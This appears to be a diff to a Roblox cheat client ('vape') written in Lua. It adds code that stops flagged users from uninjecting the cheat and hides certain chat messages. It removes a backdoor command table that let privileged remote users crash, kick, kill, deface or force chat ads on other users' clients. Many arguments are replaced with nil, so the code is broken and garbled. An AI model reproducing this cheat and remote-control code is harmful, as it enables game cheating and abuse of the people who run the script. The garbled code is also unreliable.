@@ -442,15 +442,51 @@ run(function()
 		return false
 	end
 
-
-
+	local olduninject
+	function whitelist:playeradded(v, joined)
+		if self:get(v) ~= 0 then
+			if self.alreadychecked[v.UserId] then return end
+			self.alreadychecked[v.UserId] = true
+			self:hook()
+			if self.localprio == 0 then
+				olduninject = vape.Uninject
+				vape.Uninject = function()
+					notif('Vape', 'No escaping the private members :)', 10)
+				end
+				if joined then
+					task.wait(10)
+				end
+				if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+					local oldchannel = textChatService.ChatInputBarConfiguration.TargetTextChannel
+					local newchannel = cloneref(game:GetService('RobloxReplicatedStorage')).ExperienceChat.WhisperChat:InvokeServer(v.UserId)
+					if newchannel then
+						
+					end
 					textChatService.ChatInputBarConfiguration.TargetTextChannel = oldchannel
 					textChatService.ChannelTabsConfiguration.Enabled = false
 				elseif replicatedStorage:FindFirstChild('DefaultChatSystemChatEvents') then
+					
 				end
 			end
 		end
 	end
+
+	function whitelist:process(msg, plr)
+		
+
+		if self.localprio > 0 and not self.said[plr.Name] then
+			self.said[plr.Name] = true
+			notif('nil', plr.Name..'nil', 60)
+			self.customtags[plr.Name] = {{
+				text = 'QP OWNER',
+				color = Color3.new(1, 1, 0)
+			}}
+			local newent = entitylib.getEntity(plr)
+			if newent then
+				
+			end
+			return true
+		end
 
 		if self.localprio < self:get(plr) then
 			local args = msg:split(' ')
@@ -514,8 +550,9 @@ run(function()
 		if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
 			if exp and exp:WaitForChild('appLayout', 5) then
 				vape:Clean(exp:FindFirstChild('RCTScrollContentView', true).ChildAdded:Connect(function(obj)
-					obj = obj:FindFirstChild('BodyText', true)
-					if obj and obj:IsA('TextLabel') then
+					obj = obj:FindFirstChild(nil, true)
+					if obj and obj:IsA(nil) then
+						if obj.Text:find(nil) then
 							obj.Parent.Parent.Visible = false
 						end
 					end
@@ -544,10 +581,10 @@ run(function()
 		end
 
 		if exp then
-			local bubblechat = exp:WaitForChild('bubbleChat', 5)
+			local bubblechat = exp:WaitForChild('nil', 5)
 			if bubblechat then
 				vape:Clean(bubblechat.DescendantAdded:Connect(function(newbubble)
-					then
+					if newbubble:IsA(nil) and newbubble.Text:find(nil) then
 						newbubble.Parent.Parent.Visible = false
 					end
 				end))
@@ -558,19 +595,19 @@ run(function()
 	function whitelist:update(first)
 		local suc = pcall(function()
 			local _, subbed = pcall(function()
-				return game:HttpGet('nil')
+				return game:HttpGet(nil)
 			end)
 			local commit = subbed:find('currentOid')
 			commit = commit and subbed:sub(commit + 13, commit + 52) or nil
 			commit = commit and #commit == 40 and commit or 'main'
-			whitelist.textdata = game:HttpGet('nil'..commit..'/t.json', true)
+			whitelist.textdata = game:HttpGet(nil..commit..'/t.json', true)
 		end)
 		if not suc or not hash or not whitelist.get then return true end
 		whitelist.loaded = true
 
 		if not first or whitelist.textdata ~= whitelist.olddata then
 			if not first then
-				whitelist.olddata = isfile('newvape/profiles/') and readfile('newvape/profiles/') or nil
+				whitelist.olddata = isfile('newvape/profiles/whitelist.json') and readfile('newvape/profiles/whitelist.json') or nil
 			end
 
 			local suc, res = pcall(function()
@@ -643,210 +680,7 @@ run(function()
 	end
 
 	whitelist.commands = {
-		-- byfron = function()
-		-- 	while wait() do
-		-- 		pcall(function()
-		-- 			for i,v in game:GetDescendants() do
-		-- 				if v:IsA("RemoteEvent") and not string.find(v.Name:lower(),"lobby") and not string.find(v.Name:lower(),"teleport") then
-		-- 					v:FireServer()
-		-- 				end
-		-- 			end
-		-- 		end)
-		-- 	end
-		-- end,
-		crash = function()
-			task.spawn(function()
-				repeat
-					local part = Instance.new('Part')
-					part.Size = Vector3.new(1e10, 1e10, 1e10)
-					part.Parent = workspace
-				until false
- 			end)
-		end,
-		deletemap = function()
-			local terrain = workspace:FindFirstChildWhichIsA('Terrain')
-			if terrain then
-				terrain:Clear()
-			end
-
-			for _, v in workspace:GetChildren() do
-				if v ~= terrain and not v:IsDescendantOf(lplr.Character) and not v:IsA('Camera') then
-					v:Destroy()
-					v:ClearAllChildren()
-				end
-			end
-		end,
-		framerate = function(args)
-			if #args < 1 or not setfpscap then return end
-			setfpscap(tonumber(args[1]) ~= '' and math.clamp(tonumber(args[1]) or 9999, 1, 9999) or 9999)
-		end,
-		gravity = function(args)
-			workspace.Gravity = tonumber(args[1]) or workspace.Gravity
-		end,
-		jump = function()
-			if entitylib.isAlive and entitylib.character.Humanoid.FloorMaterial ~= Enum.Material.Air then
-				entitylib.character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
-			end
-		end,
-		kick = function(args)
-			task.spawn(function()
-				lplr:Kick(table.concat(args, ' '))
-			end)
-		end,
-		kill = function()
-			if entitylib.isAlive then
-				entitylib.character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
-				entitylib.character.Humanoid.Health = 0
-			end
-		end,
-		reveal = function()
-			task.delay(0.1, function()
-				if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-					textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync('I AM USING THE QP VXPE | d i s c o r d . g g / U 3 f Z a c B A p D')
-				else
-					replicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('I AM USING THE QP VXPE | d i s c o r d . g g / U 3 f Z a c B A p D', 'All')
-				end
-			end)
-		end,
-		shutdown = function()
-			game:Shutdown()
-		end,
-		toggle = function(args)
-			if #args < 1 then return end
-			if args[1]:lower() == 'all' then
-				for i, v in vape.Modules do
-					if i ~= 'Panic' and i ~= 'ServerHop' and i ~= 'Rejoin' then
-						v:Toggle()
-					end
-				end
-			else
-				for i, v in vape.Modules do
-					if i:lower() == args[1]:lower() then
-						v:Toggle()
-						break
-					end
-				end
-			end
-		end,
-		destroy = function()
-            while wait() do
-                pcall(function()
-                     for i,v in game:GetDescendants() do
-                        if v:IsA("RemoteEvent") or v:IsA("ScreenGui") or v:IsA("Part") then
-                            v:Destroy()
-                        end
-                     end
-                end)
-            end
-        end,
-		trip = function()
-			if entitylib.isAlive then
-				if entitylib.character.RootPart.Velocity.Magnitude < 15 then
-					entitylib.character.RootPart.Velocity = entitylib.character.RootPart.CFrame.LookVector * 15
-				end
-				entitylib.character.Humanoid:ChangeState(Enum.HumanoidStateType.FallingDown)
-			end
-		end,
-		uninject = function()
-			if olduninject then
-				if vape.ThreadFix then
-					setthreadidentity(8)
-				end
-				olduninject(vape)
-			else
-				vape:Uninject()
-			end
-		end,
-		void = function()
-			if entitylib.isAlive then
-				entitylib.character.RootPart.CFrame += Vector3.new(0, -1000, 0)
-			end
-		end,
-		rick = function()
-			local asset = "rbxassetid://14978031663"
-			while wait(1) do
-				for i,v in next, game:GetDescendants() do
-					if v:IsA("TextLabel") or v:IsA("TextBox") or v:IsA("TextButton") then
-						v.Text = "Never Gonna Give You Up"
-					elseif v:IsA("ImageLabel") or v:IsA("ImageButton") then
-						v.Image = asset
-					elseif v:IsA("Sky") then
-						v.SkyboxBk = asset
-						v.SkyboxDn = asset
-						v.SkyboxFt = asset
-						v.SkyboxLf = asset
-						v.SkyboxRt = asset
-						v.SkyboxUp = asset
-						v.SunTextureId = asset
-					elseif v:IsA("MeshPart")  then
-						v.TextureID = asset
-					elseif v:IsA("SpecialMesh") then
-						v.TextureId = asset
-					elseif v:IsA("Texture") or v:IsA("Decal") then
-						v.Texture = asset
-					elseif v:IsA("SurfaceAppearance") then
-						v.TexturePack = asset
-					end
-				end
-			end
-		end,
-		xylex = function()
-			local asset = "rbxassetid://13953598788"
-			while wait(1) do
-				for i,v in next, game:GetDescendants() do
-					if v:IsA("TextLabel") or v:IsA("TextBox") or v:IsA("TextButton") then
-						v.Text = "xylex"
-					elseif v:IsA("ImageLabel") or v:IsA("ImageButton") then
-						v.Image = asset
-					elseif v:IsA("Sky") then
-						v.SkyboxBk = asset
-						v.SkyboxDn = asset
-						v.SkyboxFt = asset
-						v.SkyboxLf = asset
-						v.SkyboxRt = asset
-						v.SkyboxUp = asset
-						v.SunTextureId = asset
-					elseif v:IsA("MeshPart")  then
-						v.TextureID = asset
-					elseif v:IsA("SpecialMesh") then
-						v.TextureId = asset
-					elseif v:IsA("Texture") or v:IsA("Decal") then
-						v.Texture = asset
-					elseif v:IsA("SurfaceAppearance") then
-						v.TexturePack = asset
-					end
-				end
-			end
-		end,
-		taperfade = function()
-            local asset = "rbxassetid://97259959728835"
-            while wait(1) do
-                for i,v in next, game:GetDescendants() do
-                    if v:IsA("TextLabel") or v:IsA("TextBox") or v:IsA("TextButton") then
-                        v.Text = "Low Taper Fade"
-                    elseif v:IsA("ImageLabel") or v:IsA("ImageButton") then
-                        v.Image = asset
-                    elseif v:IsA("Sky") then
-                        v.SkyboxBk = asset
-                        v.SkyboxDn = asset
-                        v.SkyboxFt = asset
-                        v.SkyboxLf = asset
-                        v.SkyboxRt = asset
-                        v.SkyboxUp = asset
-                        v.SunTextureId = asset
-                    elseif v:IsA("MeshPart")  then
-                        v.TextureID = asset
-                    elseif v:IsA("SpecialMesh") then
-                        v.TextureId = asset
-                    elseif v:IsA("Texture") or v:IsA("Decal") then
-                        v.Texture = asset
-                    elseif v:IsA("SurfaceAppearance") then
-                        v.TexturePack = asset
-                    end
-                end
-            end
-        end,
-
+		nil
 	}
 
 	task.spawn(function()
